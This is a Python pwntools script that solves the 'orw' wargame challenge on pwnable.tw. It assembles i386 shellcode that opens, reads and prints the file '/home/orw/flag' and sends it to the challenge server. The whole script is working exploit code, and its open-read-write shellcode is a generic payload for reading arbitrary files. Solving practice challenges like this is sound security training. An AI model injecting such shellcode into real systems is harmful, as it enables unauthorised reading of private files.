from pwn import *
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'

source = """
/* push flag location string */
push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f

/* call open */
push (SYS_open)
pop eax
mov ebx, esp
xor ecx, ecx
int 0x80

/* save file descriptor into ebx */
mov ebx, eax

/* call read */
push (SYS_read)
pop eax
push 0x40
pop edx
mov ecx, esp /* read onto stack */
int 0x80

/* call write */
push (SYS_write)
pop eax
push 1
pop ebx
push 0x40
pop edx
int 0x80
"""

payload = asm(source)

r = remote("chall.pwnable.tw", port=10001)
#r = process(["gdbserver", "localhost:1234", "orw"])
#r = process("orw")

r.send(payload)
r.interactive()